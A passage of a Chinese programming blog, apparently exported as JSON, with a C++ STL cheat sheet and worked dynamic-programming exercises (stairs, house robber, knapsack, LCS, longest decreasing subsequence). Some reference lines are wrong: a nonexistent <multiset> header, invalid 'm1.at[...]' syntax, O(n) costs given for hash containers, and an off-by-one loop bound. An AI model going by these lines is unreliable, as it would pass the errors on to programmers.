函数功能： 函数lower_bound()在first和last中的前闭后开区间进行二分查找，返回大于或等于val的第一个元素位置。如果所有元素都小于val，则返回last的位置 举例如下： 一个数组number序列为：4,10,11,30,69,70,96,100.设要插入数字3,9,111.pos为要插入的位置的下标 则 pos = lower_bound( number, number + 8, 3) -number，pos = 0.即numbe数组的下标为0的位置。 pos = lower_bound( number, number + 8, 9) -number， pos = 1，即number数组的下标为1的位置（即10所在的位置）。 pos = lower_bound( number, number + 8, 111)- number， pos = 8，即number数组的下标为8的位置（但下标上限为7，所以返回最后一个元素的下一个元素）。 所以，要记住：函数lower_bound()在first和last中的前闭后开区间进行二分查找，返回大于或等于val的第一个元素位置。如果所有元素都小于val，则返回last的位置，且last的位置是越界的！！~ 返回查找元素的第一个可安插位置，也就是“元素值&gt;=查找值”的第一个元素的位置 upper_bound():头文件：#include&lt;algorithm&gt; 函数模板： 如binary_search() 函数功能：函数upper_bound()返回的在前闭后开区间查找的关键字的上界，返回大于val的第一个元素位置 例如：一个数组number序列1,2,2,4.upper_bound(2)后，返回的位置是3（下标）也就是4所在的位置,同样，如果插入元素大于数组中全部元素，返回的是last。(注意：数组下标越界) 返回查找元素的最后一个可安插位置，也就是“元素值&gt;查找值”的第一个元素的位置 注意： lower_bound(val):返回容器中第一个值【大于或等于】val的元素的iterator位置。 upper_bound(val): 返回容器中第一个值【大于】val的元素的iterator位置。 lower的意义是对于给定的已经排好序的a，key最早能插入到那个位置 0 1 | 2 2 3 所以2最早插入到2号位置 upper的意义是对于给定的已经排好序的a，key最晚能插入到那个位置 0 1 2 2 | 3 所以2最晚插入到4号位置 binary_search()查找某个元素是否出现（二分法查找）binary_search(a,a+n,number) fill():和sort差不多，fill(a,a+n,number)给数组||容器赋值number max_element() &amp; min_element():这个的话还是蛮好用的，比自己一个循环写下来要快的多了，简单用法如下： 1position=max_element(a,a+n)-a; 这样写的话就代表的是找到的最大元素的位置在哪里，position代表位置， 值得注意的一点是这个返回的是最大元素的位置，即指针指向第一个最大元素我们用以下方式表示找到的最大元素的值 1printf(\"%d\\n\",*max_element(a,a+n)); 同时 min_element的用法同上，但是都有一个共同点，就是找到的位置都是第一个最大（小）的元素，即存在多个相同大小的元素的时候找到的是第一个. min(),max()最大最小 swap()swap(a,b)交换 reverse()反转reverse(v.begin(), v.end()); reverse(a,a+n) sort(),stable_sort()sort(v1.begin(), v1.end(), cmp); //不稳定排序stable_sort(v1.begin(), v1.end(), cmp); //稳定排序 find()find函数主要实现的是在容器内(数组也可以)查找指定的元素，并且这个元素必须是基本数据类型的。查找成功返回一个指向指定元素的迭代器，查找失败返回end迭代器。 还有一个find_if()函数。 search()iter = search(v1.begin(), v1.end(), v2.begin(), v2.end()); //在v1中查找是否有区间包含v2，若没找到，返回v1.end() 用于在序列 A 中查找序列 B 第一次出现的位置。 迭代器1234567891011begin() / end(); //迭代rbegin() / rend(); //反向迭代cbegin() / cend(); //const迭代crbegin() / crend(); //const反向迭代//冒号遍历，基于迭代器实现，但遍历过程中insert和erase将引发无定义的行为，//不能修改set和map的key等本身无法修改的元素for (auto v:vec); //冒号遍历（只读）for (auto&amp; v:vec); //冒号遍历（读写）iter = set1.erase(iter); //迭代过程中的安全erase string12345678910111213141516171819#include &lt;string&gt;string s1(\"hello\"); //与下一行效果相同string s1 = \"hello\";string s1(4, '='); //生成4个'='组成的字符串string s1(s2, 0, s2.size()); //拷贝另一个字符串的某个区间初始化s1.clear(); //清空s1.size(); //返回字符串长度，与下一行效果相同（不计'\\0'）s1.length();s1.empty(); //是否为空s1.c_str(); //返回const char*形式s1.substr(0, s1.size()); //返回指定区间内的子串，深拷贝s1.append(s2, 0, s2.size()); //字符串后接另一个字符串的某个区间to_string(100); //数值型转字符串stoi(\"100\"); //字符串转整型stod(\"0.1\"); //字符串转浮点型 vector1234567891011121314151617181920212223#include &lt;vector&gt;vector&lt;int&gt; v1 = v2; //深拷贝构造vector&lt;int&gt; v1 = &#123;0,1,2,3&#125;; //initializer_list初始化vector&lt;int&gt; v1(v2.begin(), v2.end()); //vector或array初始化vector&lt;int&gt; v1(7); //初始化有7个元素的vectorvector&lt;int&gt; v1(7, 3) //初始化有7个3的vectorvector&lt;int&gt; v1(r, vector&lt;int&gt;(c, 0)) //初始化r行c列全为0的矩阵v1.clear(); //清空v1.size(); //返回元素数量v1.empty(); //是否为空v1.front(); //访问第一个元素v1.back(); //访问最后一个元素v1.push_back(100); //末尾插入元素v1.pop_back(); //清除末尾元素iter = v1.insert(v1.begin(), 100); //在vector最前面插入100iter = v1.insert(v1.begin(), v2.begin(), v2.end()); //插入另一个数组iter = v1.erase(v1.begin()+2); //erase一个数iter = v1.erase(v1.begin()+2, v1.begin()+5); //erase一个区间 stack12345678910#include &lt;stack&gt;s1.clear(); //清空s1.size(); //返回元素数量s1.empty(); //是否为空s1.top(); //返回栈顶元素s1.push(100); //压栈s1.pop(); //弹栈 queue/deque1234567891011121314#include &lt;queue&gt;#include &lt;deque&gt;q1.clear(); //清空q1.size(); //返回元素数量q1.empty(); //是否为空q1.front(); //返回第一个元素q1.back(); //返回最后一个元素q1.push_front(100); //首位插入100q1.push_back(100); //末位插入100q1.pop_front(); //弹出第一个元素q1.pop_back(); //弹出最后一个元素 优先级队列1234567891011121314151617181920212223242526272829303132//使用堆实现，建堆O(n)，插入O(logn)，删除O(logn)，查找同vector#include &lt;queue&gt;priority_queue&lt;int, vector&lt;int&gt;, less&lt;int&gt;&gt; maxQ; //大顶堆priority_queue&lt;int, vector&lt;int&gt;, greater&lt;int&gt;&gt; minQ; //小顶堆priority_queue&lt;int&gt; q1(less&lt;int&gt;(), v1); //用v1初始化大顶堆q1.clear(); //清空q1.size(); //返回元素数量q1.empty(); //是否为空q1.top(); //返回堆顶元素q1.push(100); //压入堆q1.pop(); //弹出堆顶//自定义比较函数Comp类的写法struct CompLess &#123; bool operator() (const int a, const int b) &#123; return a &lt; b; &#125;&#125;;//另一种建heap的方式#include &lt;algorithm&gt;std::make_heap(v.begin(), v.end(), comp); //建最大堆，v.front()为最大元素v.push_back(6);std::push_heap(v.begin(), v.end()); //其他部分为最大堆，末尾元素为新插入，进行上滤std::pop_heap(v.begin(), v.end(), comp); //堆顶与堆底交换，然后下滤v.pop_back() pair1234567#include &lt;utility&gt;pair&lt;int, string&gt; p1(1, \"Tom\"); //生成一个pairpair&lt;int, string&gt;(1, \"Tom\"); //与下两行效果相同，类型由用户指定pair(1, \"Tom\"); //与上一行效果相同，编译器判断变量类型make_pair(1, \"Tom\"); //与上一行效果相同，编译器判断变量类型p1.first;p1.second; set/multiset1234567891011121314151617181920212223//基于红黑树实现，有自动排序，插入O(logn)，查找O(logn)，删除O(logn)//也导致无法直接修改set中的元素，只能先删除再插入#include &lt;set&gt;#include &lt;multiset&gt;set&lt;int, less&lt;int&gt;&gt; c1(c2); //深拷贝构造set&lt;int, less&lt;int&gt;&gt; c1(c2.begin(), c2.end());set&lt;int, less&lt;int&gt;&gt; c1(c2.begin(), c2.end(), comp); //迭代器返回的元素依次排序c1.clear(); //清空c1.size(); //返回元素数量c1.empty(); //是否为空c1.count(elem); //返回elem的count，可以用于判断set中是否有elemc1.find(elem); //返回指向elem的迭代器，用\"!=c1.end()\"判断是否找到c1.lower_bound(elem); //返回指向首个不小于elem的迭代器c1.upper_bound(elem); //返回指向首个大于elem的迭代器c1.insert(elem); //插入单个elemc1.insert(c2.begin(), c2.end()); //插入另一个set的某个区间c1.erase(elem); //返回被移除的元素的数量c1.erase(iter); //清除iter指向的元素c1.erase(c1.begin()+2, c1.begin()+5); //清除某个区间 unordered_set/unordered_multiset123456//基于哈希表实现，插入O(n)，查找O(n)，删除O(n)//代价占用内存比set/multiset略大一点点，内部元素不排序#include &lt;unordered_set&gt;//大部分函数同set/multiset//由于内部元素不排序，不能使用lower_bound和upper_bound map/multimap123456789101112131415161718192021222324//基于红黑树实现，依据key自动排序，插入O(logn)，查找O(logn)，删除O(logn)//也导致无法直接修改map中的元素，只能先删除再插入#include &lt;map&gt;map&lt;int, string&gt; m1 = &#123;&#123;2015, \"Tom\"&#125;, &#123;2016, \"Jim\"&#125;&#125;; //构造函数m1.clear(); //清空m1.size(); //返回元素数量m1.empty(); //是否为空m1.at[2015] = \"Tom\"; //取值，会检查key是否存在m1[2015] = \"Tom\"; //若key存在则修改value，若不存在则创建m1.count(key); //返回相应key的count，可以用于判断map中是否存在该keyiter = m1.find(key); //返回指向key的迭代器，用\"!=m1.end()\"判断是否找到c1.lower_bound(key); //返回指向首个不小于key的迭代器c1.upper_bound(key); //返回指向首个大于key的迭代器m1.insert(make_pair(2015, \"Tom\")); //使用pair插入m1.insert(pair&lt;int, string&gt;(2015, \"Tom\"));m1.insert(&#123;2015, \"Tom\"&#125;); //initializer_list插入m1.erase(key); //返回被移除的元素的数量m1.erase(iter); //清除iter指向的元素m1.erase(m1.begin()+2, m1.begin()+5); //清除某个区间 unordered_map/unordered_multimap123456//基于哈希表实现，插入O(n)，查找O(n)，删除O(n)//代价占用内存比map/multimap略大一点点，内部元素不排序#include &lt;unordered_map&gt;//大部分函数同map/multimap//由于内部元素不排序，不能使用lower_bound和upper_bound list1234567891011121314151617181920list&lt;int&gt; l1 = l2; //深拷贝构造list&lt;int&gt; l1 = &#123;0,1,2,3&#125;; //initializer_list初始化list&lt;int&gt; l1(l2.begin(), l2.end()); list&lt;int&gt; l1(7); //初始化有7个元素的listlist&lt;int&gt; l1(7, 3) //初始化有7个3的listl1.clear(); //清空l1.size(); //返回元素数量l1.empty(); //是否为空l1.front(); //访问第一个元素l1.back(); //访问最后一个元素l1.push_back(100); //末尾插入元素l1.pop_back(); //清除末尾元素iter = l1.insert(l1.begin(), 100); //在vector最前面插入100iter = l1.insert(l1.begin(), l2.begin(), l2.end()); //插入另一个数组iter = l1.erase(l1.begin()+2); //erase一个数iter = l1.erase(l1.begin()+2, l1.begin()+5); //erase一个区间 基础输入输出12345678# include&lt;string&gt;std::string str;std::getline(std::cin, str); //会把'\\n'去除std::getline(std::cin, str, ' '); //设置分隔符，此时将空格视为一行的结束，'\\n'会被读入/*立即在空白符分隔输入后使用时，例如在 int n; std::cin &gt;&gt; n; 后， getline 会用 operator&gt;&gt; 消耗掉留在输入流上的换行符，并立即返回。常用解决方案是在切换到面向行输入前，用 cin.ignore(std::numeric_limits&lt;std::streamsize&gt;::max(), '\\n'); 忽略输入行上所有剩下的字符。*/ 匿名函数1234sort(v.begin(), v.end(), [](const int&amp; a, const int&amp; b) &#123; return a &lt; b; &#125;);","categories":[{"name":"C++","slug":"C","permalink":"http://aotle.top/categories/C/"}],"tags":[{"name":"STL","slug":"STL","permalink":"http://aotle.top/tags/STL/"}]},{"title":"动态规划","slug":"动态规划","date":"2020-11-07T09:47:54.000Z","updated":"2020-12-03T13:52:26.387Z","comments":true,"path":"2020/11/07/dongtaiguihua/","link":"","permalink":"http://aotle.top/2020/11/07/dongtaiguihua/","excerpt":"动态规划入门，也算是考试复习⑧","text":"动态规划入门，也算是考试复习⑧ 跳台阶题目描述一只青蛙一次可以跳上1级台阶，也可以跳上2级。求该青蛙跳上一个n级的台阶总共有多少种跳法。 输入多组测试样例。每组测试样例包含一个整数n。(1&lt;=n&lt;=100) 输出每组测试样例输出一行，表示青蛙跳上n级台阶的跳法数量. 所得到的结果模1000000007 样例输入1234 样例输出1235 思路动态规划 dp[n]=dp[n-1]+dp[n-2] 跳到第n阶的方法等于跳到第n-1阶再跳一次加上跳到第n-2阶再跳两阶。dp[1]=1;dp[0]=1;dp[2]=2; 代码1234567891011121314151617#include &lt;bits/stdc++.h&gt;using namespace std;//动态规划入门题，跳台阶int dp[105];int n;int main()&#123; dp[0] = 1; dp[1] = 1; dp[2] = 2; for (int i = 3; i &lt; 100;++i)&#123; dp[i] = (dp[i - 1] + dp[i - 2]) % 1000000007; &#125; while(cin&gt;&gt;n)&#123; cout &lt;&lt; dp[n] &lt;&lt; endl; &#125;&#125; 打家劫舍题目描述你是一个专业的小偷，计划偷窃沿街的房屋。每间房内都藏有一定的现金，影响你偷窃的唯一制约因素就是相邻的房屋装有相互连通的防盗系统，如果两间相邻的房屋在同一晚上被小偷闯入，系统会自动报警。 给定一个代表每个房屋存放金额的非负整数数组，计算你 不触动警报装置的情况下 ，一夜之内能够偷窃到的最高金额。 12345678910111213141516示例 1：输入：[1,2,3,1]输出：4解释：偷窃 1 号房屋 (金额 &#x3D; 1) ，然后偷窃 3 号房屋 (金额 &#x3D; 3)。 偷窃到的最高金额 &#x3D; 1 + 3 &#x3D; 4 。示例 2：输入：[2,7,9,3,1]输出：12解释：偷窃 1 号房屋 (金额 &#x3D; 2), 偷窃 3 号房屋 (金额 &#x3D; 9)，接着偷窃 5 号房屋 (金额 &#x3D; 1)。 偷窃到的最高金额 &#x3D; 2 + 9 + 1 &#x3D; 12 。提示：0 &lt;&#x3D; nums.length &lt;&#x3D; 1000 &lt;&#x3D; nums[i] &lt;&#x3D; 400 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/house-robber 思路动态规划 ，偷最后一间，最大金额等于前面max dp[n-2]+最后一间 ，偷倒数第二间就等于max dp[n-1]； https://leetcode-cn.com/problems/house-robber/solution/dong-tai-gui-hua-jie-ti-si-bu-zou-xiang-jie-cjavap/ 代码1234567891011121314151617181920212223242526#include &lt;bits/stdc++.h&gt;using namespace std;int dp[105];int n;int rob(vector&lt;int&gt;&amp; nums) &#123; if(nums.size()==0) return 0; dp[1] = nums[0]; dp[0] = 0; for (int i = 2; i &lt;= nums.size();++i)&#123; dp[i] = max(dp[i - 2] + nums[i-1], dp[i - 1]); &#125; return dp[nums.size()];&#125;int main()&#123; int n; cin &gt;&gt; n; vector&lt;int&gt; a(n,0); for (int i = 0; i &lt; n;++i)&#123; cin &gt;&gt; a[i]; &#125; cout &lt;&lt; rob(a) &lt;&lt; endl; return 0;&#125; 买卖股票的最佳时机题目描述给定一个数组，它的第 i 个元素是一支给定股票第 i 天的价格。 如果你最多只允许完成一笔交易（即买入和卖出一支股票一次），设计一个算法来计算你所能获取的最大利润。 注意：你不能在买入股票前卖出股票。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/best-time-to-buy-and-sell-stock 输入输出1234567891011示例 1:输入: [7,1,5,3,6,4]输出: 5解释: 在第 2 天（股票价格 &#x3D; 1）的时候买入，在第 5 天（股票价格 &#x3D; 6）的时候卖出，最大利润 &#x3D; 6-1 &#x3D; 5 。 注意利润不能是 7-1 &#x3D; 6, 因为卖出价格需要大于买入价格；同时，你不能在买入前卖出股票。示例 2:输入: [7,6,4,3,1]输出: 0解释: 在这种情况下, 没有交易完成, 所以最大利润为 0。 思路最低点买入 ，最低点后面的最高点卖出。记录每个区间的最大值的最大值。动态规划 代码123456789101112int maxProfit(vector&lt;int&gt;&amp; prices) &#123; if(prices.size()&lt;=1)&#123; return 0; &#125; int maxl = 0; int minl = 10000000; for (int i = 0; i &lt; prices.size();++i)&#123; maxl = max(maxl, prices[i] - minl); minl = min(minl, prices[i]); &#125; return maxl;&#125; 最大子段和题目描述给定n个整数组成的序列a1,a2,…an, 求子段和ai+ai+1+…+aj（子段可为空集）的最大值。 输入包含多组测试数据。第一行为一个整数T(1&lt;=T&lt;=20)，代表测试数据个数。 每组测试数据第一行为一个整数n，代表有n个整数(1&lt;=n&lt;=10000)。 接下来一行有n个数x(-1000&lt;=x&lt;=1000)。 输出输出其对应的最大子段和。 样例输入123162 -11 4 13 -1 2 样例输出118 提示子段可为空集，答案为0 思路前面的和大于0，则加上，小于0则抛弃 代码12345678910111213141516171819202122232425#include &lt;bits/stdc++.h&gt;using namespace std;int dp[10005];int s[10005];int n;int main()&#123; int t; cin &gt;&gt; t; while(t--)&#123; cin &gt;&gt; n; int sum=0x80000000; for (int i = 0; i &lt; n;++i)&#123; cin &gt;&gt; s[i]; if(dp[i]&gt;0) dp[i + 1] = dp[i] + s[i]; else dp[i + 1] = s[i]; sum = max(dp[i + 1], sum); &#125; cout &lt;&lt; sum; &#125; return 0;&#125; 最长公共子序列题目描述给你一个序列X和另一个序列Z，当Z中的所有元素都在X中存在，并且在X中的下标顺序是严格递增的，那么就把Z叫做X的子序列。例如：Z=&lt;a,b,f,c&gt;是序列X=&lt;a,b,c,f,b,c&gt;的一个子序列，Z中的元素在X中的下标序列为&lt;1,2,4,6&gt;。现给你两个序列X和Y，请问它们的最长公共子序列的长度是多少？ 输入输入包含多组测试数据。每组输入占一行，为两个字符串，由若干个空格分隔。每个字符串的长度不超过100。 输出对于每组输入，输出两个字符串的最长公共子序列的长度。 样例输入123abcfbc abfcabprogramming contest abcd mnp 样例输出123420 代码12345678910111213141516171819202122#include &lt;bits/stdc++.h&gt;using namespace std;int dp[105][105] = &#123;0&#125;;char s[105];char s1[105];int n;int main()&#123; while(cin&gt;&gt;s&gt;&gt;s1)&#123; for (int i = 1; i &lt;= strlen(s);++i)&#123; for (int j = 1; j &lt;= strlen(s1);++j)&#123; if(s[i-1]==s1[j-1]) dp[i][j] = dp[i - 1][j - 1] + 1; else dp[i][j] = max(dp[i - 1][j], dp[i][j - 1]); &#125; &#125; cout &lt;&lt; dp[strlen(s)][strlen(s1)] &lt;&lt; endl; &#125; return 0;&#125; 背包问题题目描述已知有N种物品和一个可容纳C重量的背包。每种物品i的重量为Wi，价值为Pi。那么，采用怎样的装包方法才会使装入背包物品的总价值最大。 输入包含多组测试数据。第一行为一个整数T(1&lt;=T&lt;=10)，代表测试数据个数。 接下来有T组测试数据。每组测试数据第一行为背包的重量C(C&lt;10000)和物品个数N(N&lt;1000)。接下来的N行分别为物品的重量cost(1&lt;=cost&lt;=100)和价值val(1&lt;=val&lt;=3000000)。（注意：结果可能超过int范围） 输出对每组测试数据，输出其对应的所装物品的最大价值。 样例输入1234567110 52 62 36 55 44 6 样例输出115 思路节约空间，用一维数组m[i]代表容量为i的时候可以装入的最大价值。 每一次V[i][j]改变的值只与V[i-1][x] {x:1...j}有关，V[i-1][x]是前一次i循环保存下来的值；因此，可以将V缩减成一维数组，从而达到优化空间的目的，状态转移方程转换为 m(j)= max{m(j), m(j-w(i))+v(i)}； 并且，状态转移方程，每一次推导V[i][j]是通过V[i-1][j-w(i]来推导的，所以一维数组中j的扫描顺序应该从大到小(capacity到0)，否者前一次循环保存下来的值将会被修改，从而造成错误。 同样以上述例子中i=3时来说明，有: 1234567891011 1) i&#x3D;3，j&#x3D;8，w(3)&#x3D;4，v(3)&#x3D;5，有j&gt;w(3)，则B(8)&#x3D;max｛B(8)，B(8-w(3))+v(3)｝&#x3D;max｛B(8)，B(4)+5｝&#x3D;max｛7，4+5｝&#x3D;9； 2) j- -即j&#x3D;7，有j&gt;w(3)，则B(7)&#x3D;max｛B(7)，B(7-w(3))+v(3)｝&#x3D;max｛B(7)，B(3)+5｝&#x3D;max｛7，4+5｝&#x3D;9； 3) j- -即j&#x3D;6，有j&gt;w(3)，则B(6)&#x3D;max｛B(6)，B(6-w(3))+v(3)｝&#x3D;max｛B(6)，B(2)+5｝&#x3D;max｛7，3+5｝&#x3D;8； 4) j- -即j&#x3D;5，有j&gt;w(3)，则B(5)&#x3D;max｛B(5)，B(5-w(3))+v(3)｝&#x3D;max｛B(5)，B(1)+5｝&#x3D;max｛7，0+5｝&#x3D;7； 5) j- -即j&#x3D;4，有j＝w(3)，则B(4)&#x3D;max｛B(4)，B(4-w(3))+v(3)｝&#x3D;max｛B(4)，B(0)+5｝&#x3D;max｛4，0+5｝&#x3D;5； 6) j- -即j&#x3D;3，有j&lt;w(3)，继续访问数组会出现越界，所以本轮操作停止，B(0)到B(3)的值保留上轮循环（i&#x3D;2时）的值不变，进入下一轮循环i++； 如果j不逆序而采用正序j=0…capacity，如上图所示，当j=8时应该有B(8)=B(8-w(3))+v(3)=B(4)+5，然而此时的B(4)已经在j=4的时候被修改过了，原来的B(4)=4，现在B(4)=5，所以计算得出B(8)=5+5=10，显然这于正确答案不符合；所以该一维数组后面的值需要前面的值进行运算再改动，如果正序便利，则前面的值将有可能被修改掉从而造成后面数据的错误；相反如果逆序遍历，先修改后面的数据再修改前面的数据，此种情况就不会出错了； 参考：https://www.cnblogs.com/christal-r/p/dynamic_programming.html 代码1234567891011121314151617181920212223242526272829303132333435363738394041#include &lt;iostream&gt;using namespace std;typedef long long ll;const int maxn = 1005;ll m[maxn][maxn];int main()&#123; int t, n; ll c, w[maxn], v[maxn]; scanf(\"%d\", &amp;t); //cin &gt;&gt; t; while (t--) &#123; scanf(\"%lld %d\", &amp;c, &amp;n); //cin &gt;&gt; c &gt;&gt; n; for (int i = 1; i &lt;= n; i++) &#123; scanf(\"%lld %lld\", &amp;w[i], &amp;v[i]); //cin &gt;&gt; w[i] &gt;&gt; v[i]; &#125; int i,j,jMax = min(w[n] - 1, c); for (int j = 0; j &lt;= jMax; j++) m[n][j] = 0; for (int j = w[n]; j &lt;= c; j++) m[n][j] = v[n]; for (int i = n - 1; i &gt; 1; i--) &#123; jMax = min(w[i] - 1, c); for (int j = 0; j &lt;= jMax; j++) m[i][j] = m[i + 1][j]; for (int j = w[i]; j &lt;= c; j++) m[i][j] = max(m[i + 1][j], m[i + 1][j - w[i]] + v[i]); &#125; m[1][c] = m[2][c]; if (c &gt;= w[1]) m[1][c] = max(m[1][c], m[2][c - w[1]] + v[1]); printf(\"%lld\\n\", m[1][c]); //cout &lt;&lt; m[1][c] &lt;&lt; endl; &#125; return 0;&#125; 1234567891011121314151617181920212223242526272829303132#include &lt;iostream&gt;using namespace std;typedef long long ll;const int maxn = 1005;ll m[10005];int main()&#123; int t, n; ll c, w[maxn], v[maxn]; scanf(\"%d\", &amp;t); //cin &gt;&gt; t; while (t--) &#123; scanf(\"%lld %d\", &amp;c, &amp;n); //cin &gt;&gt; c &gt;&gt; n; for (int i = 1; i &lt;= n; i++) &#123; scanf(\"%lld %lld\", &amp;w[i], &amp;v[i]); //cin &gt;&gt; w[i] &gt;&gt; v[i]; &#125; for (int i = 1; i &lt;= n;i++)&#123; for (int j = c; j &gt;= 1;j--)&#123; if(m[j]&lt;=m[j-w[i]]+v[i] &amp;&amp; j-w[i]&gt;=0 )//二维变一维，防止越界 &#123; m[j]=m[j-w[i]]+v[i]; &#125; &#125; &#125; cout &lt;&lt; m[c] &lt;&lt; endl; &#125; return 0;&#125; 123456789101112131415161718192021222324252627282930#include&lt;iostream&gt;#include&lt;vector&gt;using namespace std;int main()&#123; int w, n; cin &gt;&gt; w &gt;&gt; n; vector&lt;int&gt; wei(1), val(1); for(int i = 0; i &lt; n; i++) &#123; int a, b; cin &gt;&gt; a &gt;&gt; b; wei.push_back(a); val.push_back(b); &#125; vector&lt;vector&lt;int&gt;&gt; dp(n+1, vector&lt;int&gt;(w+1)); for(int i = 1; i &lt;= n; i++) &#123; for(int j = 1; j &lt;= w; j++) &#123; if(wei[i] &gt; j) dp[i][j] = dp[i-1][j]; else dp[i][j] = max(dp[i-1][j-wei[i]]+val[i], dp[i-1][j]); &#125; &#125; cout &lt;&lt; dp[n][w] &lt;&lt; endl;&#125; 节食的限制题目描述Bessie像她的诸多姊妹一样，因為从Farmer John的草地吃了太多美味的草而长出了太多的赘肉。所以FJ将她置於一个及其严格的节食计划之中。她每天不能吃多过H(5&lt;=H&lt;=45000)公斤的乾草。Bessie只能吃一整綑乾草；当她开始吃一綑乾草的之后就再也停不下来了。她有一个完整的N(1&lt;=n&lt;=50)綑可以给她当作晚餐的乾草的清单。她自然想要尽量吃到更多的乾草。很自然地，每綑乾草只能被吃一次（即使在列表中相同的重量可能出现2次，但是这表示的是两綑乾草，其中每綑乾草最多只能被吃掉一次）。 给定一个列表表示每綑乾草的重量Si(1&lt;=Si&lt;=H),求Bessie不超过节食的限制的前提下可以吃掉多少乾草（注意一旦她开始吃一綑乾草就会把那一綑乾草全部吃完）。 输入第一行：两个由空格隔开的整数：H和N， 第2到N+1行：第i+1行是一个单独的整数，表示第i綑乾草的重量Si。 输出一个单独的整数表示Bessie在限制范围内最多可以吃多少公斤的乾草。 样例输入1234556 415192021 样例输出156 思路重量和价值相等的0-1背包问题。 代码12345678910111213141516171819202122232425262728#include &lt;iostream&gt;using namespace std;typedef long long ll;const int maxn = 55;ll m[45005];int main()&#123; int n; ll c, w[maxn]; scanf(\"%lld %d\", &amp;c, &amp;n); //cin &gt;&gt; c &gt;&gt; n; for (int i = 1; i &lt;= n; i++) &#123; scanf(\"%lld\", &amp;w[i]); //cin &gt;&gt; w[i] &gt;&gt; v[i]; &#125; for (int i = 1; i &lt;= n;i++)&#123; for (int j = c; j &gt;= 1;j--)&#123; if(m[j]&lt;=m[j-w[i]]+w[i] &amp;&amp; j-w[i]&gt;=0 )//二维变一维 &#123; m[j]=m[j-w[i]]+w[i]; &#125; &#125; &#125; cout &lt;&lt; m[c] &lt;&lt; endl; return 0;&#125; 汽车费用题目描述一个特别的单行街道在每公里处有一个汽车站。顾客根据他们乘坐汽车的公里使来付费。例如下表就是一个费用的单子。没有一辆车子行驶超过10公里，一个顾客打算行驶n公里(1&lt;=n&lt;100)，它可以通过无限次的换车来完成旅程。最后要求费用最少。 输入第一行十个整数分别表示行走1到10公里的费用(&lt;=500)。注意这些数并无实际的经济意义，即行驶10公里费用可能比行驶一公里少。第二行一个整数n表示，旅客的总路程数。 输出仅一个整数表示最少费用。 样例输入1212 21 31 40 49 58 69 79 90 10115 样例输出1147 思路动态规划，依次计算出行走i公里需要的最少费用。 计算行走i公里最少费用时，用j遍历[1~i0]，当i&gt;=j的时候依次比较m[i]和n[j]+m[i-j]的值，遍历完成后，m[i]为最少费用。 例如，m[4] = min(m[0]+n[4], m[1]+n[3], m[2]+n[2], m[3]+n[1]) 代码1234567891011121314151617181920212223#include &lt;iostream&gt;using namespace std;typedef long long ll;const int maxn = 0x7fffffff;int m[105];int n[15];int main()&#123; for (int i = 1; i &lt;= 10;++i)&#123; cin &gt;&gt; n[i]; &#125; int t; cin &gt;&gt; t; for (int i = 1; i &lt;= t;i++)&#123; m[i] = maxn; for (int j = 1; j &lt;= 10;j++)&#123; if(i&gt;=j) m[i] = min(m[i], m[i - j] + n[j]); &#125; &#125; cout &lt;&lt; m[t] &lt;&lt; endl; return 0;&#125; 求数组的最长递减子序列题目描述给定一个整数序列，输出它的最长递减（注意不是“不递增”）子序列。 输入输入包括两行，第一行包括一个正整数N（N&lt;=1000），表示输入的整数序列的长度。第二行包括用空格分隔开的N个整数，整数范围区间为[-30000,30000]。 输出输出最长递减子序列，数字之间有一个空格。 样例输入1289 4 3 2 5 4 3 2 样例输出19 5 4 3 2 思路O(nlogn)的写法，有点困了，明天起来再理解一下。 代码123456789101112131415161718192021222324252627282930313233343536#include &lt;bits/stdc++.h&gt;using namespace std;int g[30010], num[30010], d[30010];int main()&#123; int n; scanf(\"%d\", &amp;n); int inf = 0x7fffffff; fill(g, g + n, inf); for (int i = 0; i &lt; n; ++i) &#123; scanf(\"%d\", &amp;num[n - 1 - i]); &#125; //核心代码begin //挺难理解的，不过确实很厉害 for (int i = 0; i &lt; n; ++i) &#123; int j = lower_bound(g, g + n, num[i]) - g; //找到大于等于num[i]的第一个位置下标 g[j] = num[i]; //把num[i]放入g[j]的位置 d[i] = j + 1; // 实际上放的就是每个元素为结尾的最大长度 &#125; //end int s = *max_element(d, d + n); //找到最大长度 for (int i = n - 1; i &gt;= 0; --i) //为什么从后向前遍历？因为最长子序列上一个序列一定是再这个字母前面的嘛 比如 4 3 2 1 -&gt; 4是最后一个，3一定在4的前面 &#123; if (s == d[i]) &#123; if (s != 1) printf(\"%d \", num[i]); else printf(\"%d\\n\", num[i]); --s; &#125; &#125; return 0;&#125;","categories":[{"name":"算法","slug":"算法","permalink":"http://aotle.top/categories/%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"算法","slug":"算法","permalink":"http://aotle.top/tags/%E7%AE%97%E6%B3%95/"},{"name":"动态规划","slug":"动态规划","permalink":"http://aotle.top/tags/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/"}]},{"title":"资料整理","slug":"资料整理","date":"2020-11-02T08:53:04.000Z","updated":"2020-12-03T13:57:47.545Z","comments":true,"path":"2020/11/02/ziliaoshouji/","link":"","permalink":"http://aotle.top/2020/11/02/ziliaoshouji/","excerpt":"本栏目收集了平时看到的写的不错的博客。","text":"本栏目收集了平时看到的写的不错的博客。 主席树https://www.cnblogs.com/zyf0163/p/4749042.html https://www.cnblogs.com/Empress/p/4652449.html","categories":[{"name":"其他","slug":"其他","permalink":"http://aotle.top/categories/%E5%85%B6%E4%BB%96/"}],"tags":[{"name":"其他","slug":"其他","permalink":"http://aotle.top/tags/%E5%85%B6%E4%BB%96/"}]},{"title":"二分查找","slug":"二分查找","date":"2020-10-31T03:33:38.000Z","updated":"2020-11-30T11:06:38.887Z","comments":true,"path":"2020/10/31/erfenchazhao1/","link":"","permalink":"http://aotle.top/2020/10/31/erfenchazhao1/","excerpt":"二分查找算法考试复习(不仅仅是二分查找，还有一些水题)","text":"二分查找算法考试复习(不仅仅是二分查找，还有一些水题) 单词排序题目描述小红学会了很多英文单词，妈妈为了帮小红加强记忆，拿出纸、笔，把 N 个单词写在纸上的一行里，小红看了几秒钟后，将这张纸扣在桌子上。妈妈问小红：“你能否将这 N 个单词按照字典排列的顺序，从小到大写出来？”小红按照妈妈的要求写出了答案。现在请你编写程序帮助妈妈检查小红的答案是否正确。注意：所有单词都由小写字母组成，单词两两之间用一个空格分隔。 输入输入包含两行。 第一行仅包括一个正整数N(0&lt;N≤26)。 第二行包含N个单词，表示妈妈写出的单词，两两之间用一个空格分隔。 单个单词长度不超过1010。 输出输出仅有一行。针对妈妈写出的单词，按照字典排列的顺序从小到大排列成一行的结果，每个单词后带一个空格。 样例输入124city boy 